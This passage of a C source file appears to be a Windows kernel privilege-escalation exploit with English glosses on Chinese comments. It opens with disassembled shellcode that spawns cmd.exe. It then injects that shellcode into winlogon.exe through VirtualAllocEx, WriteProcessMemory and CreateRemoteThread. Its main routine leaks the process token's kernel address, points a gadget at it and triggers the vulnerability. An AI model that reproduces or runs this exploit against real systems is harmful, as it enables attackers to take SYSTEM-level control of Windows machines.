31: 3c 61                   cmp    al,0x61
33: 7c 02                   jl     0x37
35: 2c 20                   sub    al,0x20
37: 41                      inc    ecx
38: c1 c9 0d                ror    ecx,0xd
3b: 41                      inc    ecx
3c: 01 c1                   add    ecx,eax
3e: e2 ed                   loop   0x2d
40: 52                      push   edx
41: 41                      inc    ecx
42: 51                      push   ecx
43: 48                      dec    eax
44: 8b 52 20                mov    edx,DWORD PTR [edx+0x20]
47: 8b 42 3c                mov    eax,DWORD PTR [edx+0x3c]
4a: 48                      dec    eax
4b: 01 d0                   add    eax,edx
4d: 8b 80 88 00 00 00       mov    eax,DWORD PTR [eax+0x88]
53: 48                      dec    eax
54: 85 c0                   test   eax,eax
56: 74 67                   je     0xbf
58: 48                      dec    eax
59: 01 d0                   add    eax,edx
5b: 50                      push   eax
5c: 8b 48 18                mov    ecx,DWORD PTR [eax+0x18]
5f: 44                      inc    esp
60: 8b 40 20                mov    eax,DWORD PTR [eax+0x20]
63: 49                      dec    ecx
64: 01 d0                   add    eax,edx
66: e3 56                   jecxz  0xbe
68: 48                      dec    eax
69: ff c9                   dec    ecx
6b: 41                      inc    ecx
6c: 8b 34 88                mov    esi,DWORD PTR [eax+ecx*4]
6f: 48                      dec    eax
70: 01 d6                   add    esi,edx
72: 4d                      dec    ebp
73: 31 c9                   xor    ecx,ecx
75: 48                      dec    eax
76: 31 c0                   xor    eax,eax
78: ac                      lods   al,BYTE PTR ds:[esi]
79: 41                      inc    ecx
7a: c1 c9 0d                ror    ecx,0xd
7d: 41                      inc    ecx
7e: 01 c1                   add    ecx,eax
80: 38 e0                   cmp    al,ah
82: 75 f1                   jne    0x75
84: 4c                      dec    esp
85: 03 4c 24 08             add    ecx,DWORD PTR [esp+0x8]
89: 45                      inc    ebp
8a: 39 d1                   cmp    ecx,edx
8c: 75 d8                   jne    0x66
8e: 58                      pop    eax
8f: 44                      inc    esp
90: 8b 40 24                mov    eax,DWORD PTR [eax+0x24]
93: 49                      dec    ecx
94: 01 d0                   add    eax,edx
96: 66 41                   inc    cx
98: 8b 0c 48                mov    ecx,DWORD PTR [eax+ecx*2]
9b: 44                      inc    esp
9c: 8b 40 1c                mov    eax,DWORD PTR [eax+0x1c]
9f: 49                      dec    ecx
a0: 01 d0                   add    eax,edx
a2: 41                      inc    ecx
a3: 8b 04 88                mov    eax,DWORD PTR [eax+ecx*4]
a6: 48                      dec    eax
a7: 01 d0                   add    eax,edx
a9: 41                      inc    ecx
aa: 58                      pop    eax
ab: 41                      inc    ecx
ac: 58                      pop    eax
ad: 5e                      pop    esi
ae: 59                      pop    ecx
af: 5a                      pop    edx
b0: 41                      inc    ecx
b1: 58                      pop    eax
b2: 41                      inc    ecx
b3: 59                      pop    ecx
b4: 41                      inc    ecx
b5: 5a                      pop    edx
b6: 48                      dec    eax
b7: 83 ec 20                sub    esp,0x20
ba: 41                      inc    ecx
bb: 52                      push   edx
bc: ff e0                   jmp    eax
be: 58                      pop    eax
bf: 41                      inc    ecx
c0: 59                      pop    ecx
c1: 5a                      pop    edx
c2: 48                      dec    eax
c3: 8b 12                   mov    edx,DWORD PTR [edx]
c5: e9 57 ff ff ff          jmp    0x21
ca: 5d                      pop    ebp
cb: 48                      dec    eax
cc: ba 01 00 00 00          mov    edx,0x1
d1: 00 00                   add    BYTE PTR [eax],al
d3: 00 00                   add    BYTE PTR [eax],al
d5: 48                      dec    eax
d6: 8d 8d 01 01 00 00       lea    ecx,[ebp+0x101]
dc: 41                      inc    ecx
dd: ba 31 8b 6f 87          mov    edx,0x876f8b31
e2: ff d5                   call   ebp
e4: bb e0 1d 2a 0a          mov    ebx,0xa2a1de0
e9: 41                      inc    ecx
ea: ba a6 95 bd 9d          mov    edx,0x9dbd95a6
ef: ff d5                   call   ebp
f1: 48                      dec    eax
f2: 83 c4 28                add    esp,0x28
f5: 3c 06                   cmp    al,0x6
f7: 7c 0a                   jl     0x103
f9: 80 fb e0                cmp    bl,0xe0
fc: 75 05                   jne    0x103
fe: bb 47 13 72 6f          mov    ebx,0x6f721347
103:    6a 00                   push   0x0
105:    59                      pop    ecx
106:    41                      inc    ecx
107:    89 da                   mov    edx,ebx
109:    ff d5                   call   ebp
10b:    63 6d 64                arpl   WORD PTR [ebp+0x64],bp
10e:    2e 65 78 65             cs gs js 0x177
... 
*/

	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	int pid = -1;
	if (Process32First(snapshot, &entry))
	{
		while (Process32Next(snapshot, &entry))
		{
			if (wcscmp(entry.szExeFile, L"winlogon.exe") == 0)
			{
				pid = entry.th32ProcessID;
				break;
			}
		}
	}

	CloseHandle(snapshot);

	if (pid < 0)
	{
		printf("Could not find process\n");
		return;
	}

	HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (!h)
	{
		printf("Could not open process: %x", GetLastError());
		return;
	}

	void* buffer = VirtualAllocEx(h, NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!buffer)
	{
		printf("[-] VirtualAllocEx failed\n");
	}

	if (!buffer)
	{
		printf("[-] remote allocation failed");
		return;
	}

	if (!WriteProcessMemory(h, buffer, shellcode, sizeof(shellcode), 0))
	{
		printf("[-] WriteProcessMemory failed");
		return;
	}

	HANDLE hthread = CreateRemoteThread(h, 0, 0, (LPTHREAD_START_ROUTINE)buffer, 0, 0, 0);

	if (hthread == INVALID_HANDLE_VALUE)
	{
		printf("[-] CreateRemoteThread failed");
		return;
	}
}



int main()
{
	// 获取函数 -> translated as "gets the functions"

	/* InitfuncAddr first looks to see if the ntdll.dll module kernel is
	present and the looks for the process addresses of RtlInitUnicodeString,
	NtCreateFile, NtSetInformationThread & NtQuerySystemInformation. All of 
	the data is stored in global variables, if any one of these can not be 
	retrieved the function will return false.
	 */

	if (!InitFuncAddr())
	{
		printf("FAIL\r\n");
		getchar;
		return 0;
	}
	// 初始化checksum 计算使用的数据 -> "Initializes the data used by the 
	// checksum calculation"
	// uses datas var defined in header.h 
	initData(); 
	PVOID pContainer = malloc(0xE0);
	if (pContainer)
	{

		ULONG64 ktoken = LeakEporcessKtoken();

		printf("[-] ktoken addr =%p\n", ktoken);

		ULONG64 GadgetAddr = GetGadgetAddr("RtlSetAllBits");

		printf("[-] GadgetAddr addr =%p\n", GadgetAddr);


		memset(pContainer, 0xCC, 0xE0);
		printf("malloc addr = %p\r\n", pContainer);


		PVOID pExpFuncAddeInKrnl = VirtualAllocEx((HANDLE)-1, (LPVOID)0x0000027300000000, 0x100, MEM_RESERVE, PAGE_READWRITE);
		VirtualAllocEx((HANDLE)-1, pExpFuncAddeInKrnl, 0x100, MEM_COMMIT, PAGE_READWRITE);

		memset(pExpFuncAddeInKrnl, 0xCC, 0x100);
		printf(">>> %p\r\n", pExpFuncAddeInKrnl);
		//*(ULONG64*)((ULONG64)pExpFuncAddeInKrnl + 0x88) = (ULONG64)((ULONG64)(GadgetAddr)+0x60);
		*(ULONG64*)((ULONG64)pExpFuncAddeInKrnl + 0x88) = GadgetAddr;
		*(ULONG64*)((ULONG64)pExpFuncAddeInKrnl + 0x98) = GadgetAddr;
		*(ULONG64*)(pContainer) = (ULONG64)(((ULONG64)pExpFuncAddeInKrnl)+0x80);
		*(ULONG64*)((ULONG64)pContainer + 0x8) = ktoken + 0x40;
		getchar();
		// 触发漏洞
		triggerPoc(pContainer);
		InjectToWinlogon();


	}

	printf("%p\r\n", datas);


	system("pause");
	return 0;

}
